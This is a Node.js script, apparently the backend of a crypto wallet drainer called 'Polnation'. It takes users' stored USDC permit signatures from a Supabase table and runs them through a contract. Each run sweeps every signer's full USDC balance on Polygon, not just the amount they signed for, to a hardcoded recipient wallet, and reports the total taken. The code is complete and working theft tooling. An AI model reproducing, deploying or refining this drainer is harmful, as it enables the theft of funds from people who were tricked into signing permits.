/**
 * Polnation Permit Executor (Smart Contract Version)
 * 
 * 功能：
 * 1. 从 Supabase 读取 pending 状态的签名
 * 2. 通过 PermitDistributor 合约执行 permit + transferFrom
 * 3. 更新签名状态
 * 
 * 与 executor.js 的区别：
 * - executor.js: 直接调用 USDC 合约（需要 EOA 作为 spender）
 * - executor-contract.js: 通过 PermitDistributor 合约调用（合约作为 spender）
 * 
 * 使用方法：
 * node executor-contract.js          - 执行所有 pending 签名
 * node executor-contract.js --check  - 只检查，不执行
 */

require('dotenv').config()
const { createClient } = require('@supabase/supabase-js')
const { 
  createWalletClient, 
  createPublicClient, 
  http, 
  parseAbi,
  formatUnits,
  keccak256,
  toBytes
} = require('viem')
const { polygon } = require('viem/chains')
const { privateKeyToAccount } = require('viem/accounts')

// ========================================
// 配置
// ========================================

const CONFIG = {
  // Supabase
  supabaseUrl: process.env.SUPABASE_URL,
  supabaseKey: process.env.SUPABASE_SERVICE_KEY,
  
  // 钱包（合约 owner）
  privateKey: process.env.PRIVATE_KEY,
  
  // RPC
  rpcUrl: process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com',
  
  // 模式
  mode: process.env.MODE || 'dry-run',
  
  // USDC 合约地址 (Polygon)
  usdcAddress: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359',
  
  // PermitDistributor 合约地址（部署后填写）
  distributorAddress: process.env.DISTRIBUTOR_CONTRACT || '',
  
  // 资金接收地址（可以是 EOA 或合约）
  recipientWallet: process.env.RECIPIENT_WALLET || '0x6c4C745d909B13528e638C7Aa63ABA9406fA8c63',
}

// USDC ABI (用于查询)
const USDC_ABI = parseAbi([
  'function balanceOf(address account) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function nonces(address owner) view returns (uint256)',
])

// PermitDistributor ABI
const DISTRIBUTOR_ABI = parseAbi([
  'function executeWithPermit(address owner, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s, address recipient, uint256 amount, bytes32 operationId)',
  'function transferFrom(address from, address to, uint256 amount, bytes32 operationId)',
  'function getAllowance(address owner) view returns (uint256)',
  'function getNonce(address owner) view returns (uint256)',
])

// ========================================
// 初始化
// ========================================

function validateConfig() {
  const required = ['supabaseUrl', 'supabaseKey', 'privateKey', 'distributorAddress']
  const missing = required.filter(key => !CONFIG[key])
  
  if (missing.length > 0) {
    console.error('❌ 缺少必要的环境变量:', missing.join(', '))
    console.error('请检查 .env 文件')
    console.error('')
    console.error('必需变量:')
    console.error('  SUPABASE_URL=xxx')
    console.error('  SUPABASE_SERVICE_KEY=xxx')
    console.error('  PRIVATE_KEY=0x...')
    console.error('  DISTRIBUTOR_CONTRACT=0x...  (部署后的合约地址)')
    process.exit(1)
  }
}

function createClients() {
  const supabase = createClient(CONFIG.supabaseUrl, CONFIG.supabaseKey)
  const account = privateKeyToAccount(CONFIG.privateKey)
  
  const publicClient = createPublicClient({
    chain: polygon,
    transport: http(CONFIG.rpcUrl),
  })
  
  const walletClient = createWalletClient({
    account,
    chain: polygon,
    transport: http(CONFIG.rpcUrl),
  })
  
  return { supabase, account, publicClient, walletClient }
}

// ========================================
// 核心功能
// ========================================

async function getPendingSignatures(supabase) {
  const { data, error } = await supabase
    .from('permit_signatures')
    .select('*, profiles(username, email)')
    .eq('status', 'pending')
    .order('created_at', { ascending: true })
  
  if (error) {
    console.error('❌ 获取签名失败:', error.message)
    return []
  }
  
  return data || []
}

async function validateSignature(publicClient, sig) {
  // 检查 deadline
  const now = Math.floor(Date.now() / 1000)
  if (sig.deadline < now) {
    return { valid: false, reason: '签名已过期' }
  }
  
  // 检查 nonce
  const currentNonce = await publicClient.readContract({
    address: CONFIG.usdcAddress,
    abi: USDC_ABI,
    functionName: 'nonces',
    args: [sig.owner_address],
  })
  
  if (BigInt(sig.nonce) !== currentNonce) {
    return { valid: false, reason: `Nonce 不匹配 (签名: ${sig.nonce}, 当前: ${currentNonce})` }
  }
  
  // 检查用户余额
  const balance = await publicClient.readContract({
    address: CONFIG.usdcAddress,
    abi: USDC_ABI,
    functionName: 'balanceOf',
    args: [sig.owner_address],
  })
  
  if (balance === 0n) {
    return { valid: false, reason: '用户 USDC 余额为 0' }
  }
  
  return { valid: true, balance }
}

/**
 * 通过合约执行签名
 */
async function executeSignatureViaContract(clients, sig) {
  const { publicClient, walletClient, supabase } = clients
  
  console.log('\n' + '='.repeat(50))
  console.log(`📝 处理签名: ${sig.id}`)
  console.log(`   用户: ${sig.profiles?.username || sig.profiles?.email || 'Unknown'}`)
  console.log(`   钱包: ${sig.owner_address}`)
  
  // 1. 验证签名
  const validation = await validateSignature(publicClient, sig)
  if (!validation.valid) {
    console.log(`   ❌ 签名无效: ${validation.reason}`)
    
    await supabase
      .from('permit_signatures')
      .update({ status: 'expired' })
      .eq('id', sig.id)
    
    return { success: false, reason: validation.reason }
  }
  
  const balanceFormatted = formatUnits(validation.balance, 6)
  console.log(`   💰 用户余额: $${balanceFormatted} USDC`)
  
  // Dry-run 模式
  if (CONFIG.mode === 'dry-run') {
    console.log(`   🔍 [Dry-Run] 签名有效，跳过执行`)
    return { success: true, dryRun: true }
  }
  
  try {
    // 生成操作 ID（用于链上追踪）
    const operationId = keccak256(toBytes(`${sig.id}-${Date.now()}`))
    
    // 通过合约执行 permit + transferFrom（一次交易完成）
    console.log(`   ⏳ 通过合约执行 permit + transfer...`)
    
    const txHash = await walletClient.writeContract({
      address: CONFIG.distributorAddress,
      abi: DISTRIBUTOR_ABI,
      functionName: 'executeWithPermit',
      args: [
        sig.owner_address,           // owner
        BigInt(sig.value),           // value (permit 授权金额)
        BigInt(sig.deadline),        // deadline
        sig.v,                       // v
        sig.r,                       // r
        sig.s,                       // s
        CONFIG.recipientWallet,      // recipient (资金接收地址)
        validation.balance,          // amount (实际转账金额)
        operationId,                 // operationId
      ],
    })
    
    console.log(`   ✅ TX: ${txHash}`)
    
    // 等待确认
    const receipt = await publicClient.waitForTransactionReceipt({ hash: txHash })
    console.log(`   📦 Block: ${receipt.blockNumber}, Gas: ${receipt.gasUsed}`)
    
    // 更新状态
    await supabase
      .from('permit_signatures')
      .update({
        status: 'used',
        used_at: new Date().toISOString(),
        used_tx_hash: txHash,
      })
      .eq('id', sig.id)
    
    console.log(`   🎉 成功转移 $${balanceFormatted} USDC`)
    
    return { 
      success: true, 
      amount: balanceFormatted,
      txHash 
    }
    
  } catch (error) {
    console.log(`   ❌ 执行失败: ${error.message}`)
    
    // 如果是合约错误，记录更多信息
    if (error.cause?.reason) {
      console.log(`   📋 合约错误: ${error.cause.reason}`)
    }
    
    return { success: false, reason: error.message }
  }
}

// ========================================
// 主程序
// ========================================

async function main() {
  console.log('╔════════════════════════════════════════════════╗')
  console.log('║   Polnation Permit Executor (Contract v1.0)    ║')
  console.log('╚════════════════════════════════════════════════╝')
  console.log('')
  
  if (process.argv.includes('--check') || process.argv.includes('--check-only')) {
    CONFIG.mode = 'dry-run'
  }
  
  validateConfig()
  
  const clients = createClients()
  
  console.log(`🔧 模式: ${CONFIG.mode === 'dry-run' ? '检查模式 (不执行)' : '执行模式'}`)
  console.log(`🔗 RPC: ${CONFIG.rpcUrl}`)
  console.log(`👛 执行钱包: ${clients.account.address}`)
  console.log(`📄 Distributor: ${CONFIG.distributorAddress}`)
  console.log(`🎯 接收地址: ${CONFIG.recipientWallet}`)
  
  // 获取待处理签名
  console.log('\n📋 获取待处理签名...')
  const signatures = await getPendingSignatures(clients.supabase)
  
  if (signatures.length === 0) {
    console.log('✅ 没有待处理的签名')
    return
  }
  
  console.log(`📝 找到 ${signatures.length} 个待处理签名`)
  
  const stats = {
    total: signatures.length,
    success: 0,
    failed: 0,
    skipped: 0,
    totalAmount: 0,
  }
  
  for (const sig of signatures) {
    const result = await executeSignatureViaContract(clients, sig)
    
    if (result.success) {
      if (result.dryRun) {
        stats.skipped++
      } else {
        stats.success++
        stats.totalAmount += parseFloat(result.amount)
      }
    } else {
      stats.failed++
    }
  }
  
  console.log('\n' + '='.repeat(50))
  console.log('📊 执行统计:')
  console.log(`   总数: ${stats.total}`)
  console.log(`   成功: ${stats.success}`)
  console.log(`   失败: ${stats.failed}`)
  console.log(`   跳过: ${stats.skipped}`)
  if (stats.totalAmount > 0) {
    console.log(`   总转移: $${stats.totalAmount.toFixed(2)} USDC`)
  }
  console.log('')
}

main().catch(console.error)
